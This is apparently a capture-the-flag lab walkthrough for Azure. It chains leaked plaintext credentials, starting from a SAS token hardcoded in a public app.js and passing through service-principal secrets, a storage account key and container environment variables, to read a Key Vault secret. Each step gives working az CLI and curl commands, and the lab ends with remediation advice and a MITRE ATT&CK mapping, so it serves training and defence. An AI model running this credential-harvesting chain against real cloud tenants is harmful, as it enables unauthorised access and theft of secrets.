# Secrets Chain — A Sequential Plaintext-Credential Attack Path

**Provider:** Azure | **Category:** Credential Exposure / Chained

## Scenario

This lab consolidates the "plaintext credentials in an Azure resource" idea into
**one sequential chain**. Instead of a single flat "read a secret from a property"
puzzle, every stage's leaked value unlocks — or names — the next resource, so you
walk a realistic post-exploitation path from an anonymous web visitor all the way
to the crown-jewel Key Vault.

The credential boundaries that matter are genuine: anonymous → SAS token →
service principal → storage data-plane key → Key Vault. The hops in between are
discovery — a leaked plaintext value tells you where to look next.

## Attack Path

```
S1  Public portal website          --> app.js hardcodes a SAS token (read+list, whole account)
        |
        v  (SAS)
S2  Private 'onboarding' blob       --> service principal client_id / client_secret / tenant
        |
        v  (az login --service-principal)
S3  Resource group tags  (Reader)  --> names the App Configuration store
        |
        v  (App Configuration Data Reader)
S4  App Configuration key-values   --> names the Data Factory
        |
        v  (Reader)
S5  Data Factory linked service     --> connection string leaks a storage account KEY
        |
        v  (storage key, data plane)
S6  Private 'runtime' blob          --> names the Container Instance
        |
        v  (Reader)
S7  Container Instance env vars     --> Key Vault name + secret name
        |
        v  (Key Vault Secrets User)
S8  Key Vault secret                --> FLAG
```

## Walkthrough

### S1 — Start unauthenticated at the portal

Open the portal's static website (the deploy prints `portal_website_url`) and read
its `app.js`. A developer hardcoded a SAS token "to simplify client-side storage
access":

```bash
curl -s "<portal_website_url>app.js"
# const STORAGE_ACCOUNT = "cnchpub...";
# const SAS_TOKEN = "?sv=2019-12-12&ss=b&srt=sco&sp=rl&...";
```

### S2 — Use the SAS to read the private onboarding note

The SAS is over-scoped (read + list across the whole account), so you can list
its containers and read a private one:

```bash
ACCOUNT="<STORAGE_ACCOUNT>"
SAS="<SAS_TOKEN>"   # the leading '?' and everything after it

az storage container list --account-name "$ACCOUNT" --sas-token "$SAS" -o table
az storage blob download --account-name "$ACCOUNT" --sas-token "$SAS" \
  -c onboarding -n onboarding.txt -f - 2>/dev/null
```

`onboarding.txt` leaks the portal **service principal** credentials.

### S3 — Log in as the service principal and read the tag

```bash
az login --service-principal -u <AZURE_CLIENT_ID> -p <AZURE_CLIENT_SECRET> --tenant <AZURE_TENANT_ID>

# Reader on the resource group — the tags point you onward:
az group show --name <resource_group_name> --query tags
```

A `config-store` tag names the **App Configuration** store.

### S4 — Enumerate App Configuration

The SP has *App Configuration Data Reader*:

```bash
az appconfig kv list --name <config-store> --all -o table
```

A key-value gives the **Data Factory** name (the rest are decoys).

### S5 — Pull the storage key out of the Data Factory linked service

```bash
# The datafactory commands need the CLI extension (installs on first use, or):
az extension add --name datafactory 2>/dev/null

az datafactory linked-service show \
  --resource-group <rg> --factory-name <data-factory-name> --name DataLakeConnection \
  --query properties.typeProperties.connectionString
```

The connection string contains a live `AccountKey=` for the data storage account.

### S6 — Use the storage key to read the runtime config

```bash
az storage blob download --account-name <data-account> --account-key <AccountKey> \
  -c runtime -n runtime.json -f - 2>/dev/null
```

`runtime.json` names the **Container Instance**.

### S7 — Read the container's environment variables

```bash
az container show --resource-group <rg> --name <container_group> \
  --query "containers[0].environmentVariables"
```

The env vars give `KEY_VAULT_NAME` and `KEY_VAULT_SECRET`.

### S8 — Read the Key Vault secret (the flag)

The SP holds *Key Vault Secrets User*:

```bash
az keyvault secret show --vault-name <KEY_VAULT_NAME> --name <KEY_VAULT_SECRET> \
  --query value -o tsv
```

That value is the flag.

## How to Fix in Production

The same lesson repeats at every hop, which is the point: **never store a
credential in a place that is more accessible than the thing it protects.**

1. Don't hardcode SAS tokens in client-side code; mint short-lived,
   least-privilege tokens from a backend (or use user-delegation SAS).
2. Don't leave service-principal secrets in blobs, notes, or repos. Use Key
   Vault references and rotate.
3. Don't record resource names/secrets in tags — tags are world-readable to any
   Reader.
4. Use Key Vault references in App Configuration and Data Factory linked
   services instead of inline connection strings/keys.
5. Don't put secrets in Container Instance non-secure env vars (they're returned
   by ARM); use `secureEnvironmentVariables` or a managed identity + Key Vault.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Steal Application Access Token | [T1528](https://attack.mitre.org/techniques/T1528/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
